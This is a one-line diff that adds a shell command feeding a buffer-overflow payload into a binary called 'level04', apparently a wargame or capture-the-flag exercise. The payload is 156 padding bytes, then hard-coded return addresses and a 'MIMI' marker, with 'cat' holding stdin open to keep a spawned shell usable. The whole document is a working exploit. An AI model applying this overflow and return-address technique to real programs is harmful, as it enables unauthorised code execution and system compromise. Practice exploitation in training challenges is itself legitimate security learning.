@@ -1,0 +1,1 @@
+(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "MIMI" + "\xec\x97\xf8\xf7"'; cat) | ./level04
